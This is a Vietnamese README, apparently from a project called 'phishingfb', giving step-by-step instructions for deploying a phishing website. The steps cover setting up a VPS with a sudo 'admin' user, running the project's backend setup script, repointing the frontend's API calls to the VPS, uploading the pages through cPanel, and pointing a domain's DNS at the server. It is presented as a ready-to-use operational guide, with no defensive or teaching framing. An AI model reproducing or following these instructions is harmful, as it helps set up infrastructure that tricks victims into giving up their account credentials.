# Hướng dẫn Deploy Web Phishing

## ❖ Chuẩn bị

✔ Đảm bảo bạn có một `VPS (Virtual Private Server)` để deploy backend.

✔ Chuẩn bị một hosting để triển khai frontend.

## ❖ Tạo người dùng và SSH vào VPS

1. Đăng nhập vào VPS qua SSH bằng tài khoản root hoặc tài khoản có quyền sudo.

2. Tạo một người dùng mới với tên **admin** bằng cách chạy lệnh sau:

   ```shell
   useradd -m admin
   ```

3. Cấp quyền sudo cho người dùng **admin** bằng cách thêm người dùng vào nhóm sudo:

   ```shell
   usermod -aG sudo admin
   ```

4. Bây giờ bạn có thể đăng nhập vào VPS bằng SSH với tài khoản **admin**:

   ```shell
   ssh admin@your_vps_ip
   ```

## ❖ Deploy Backend

1. Trong VPS, đảm bảo bạn đang đăng nhập với tài khoản **admin**.

2. Dán đoạn sau vào terminal SSH để tự động deploy backend:

   ```shell
   cd phishingfb/backend
   chmod +x setup.sh
   mv * ~/
   cd ~/
   rm -rf frontend
   ./setup.sh
   ```

## ❖ Deploy Frontend trên Hosting

1. Sửa đường dẫn API trong các tệp HTML từ `localhost:5000` thành địa chỉ IP của VPS.

2. Truy cập vào trang quản lý (`CPanel`) của hosting và tìm đến mục "File Manager". Đây là nơi bạn có thể quản lý các tệp và thư mục trên hosting của bạn.

3. Trong **File Manager**, tìm đến thư mục `public_html`

4. Mở thư mục mới vừa tạo và tải lên toàn bộ nội dung của phần frontend vào thư mục này.

5. Để đảm bảo rằng trang web của bạn sẽ được hiển thị khi người dùng truy cập vào tên miền của bạn, bạn cần gán giá trị `A Record` với tên là `@` cho địa chỉ `IP của VPS` trong bản ghi `DNS` của tên miền. Thao tác này sẽ chỉnh sửa cấu hình `DNS` để định tuyến lưu lượng truy cập đến địa chỉ `IP của VPS`.

6. Hoàn tất!
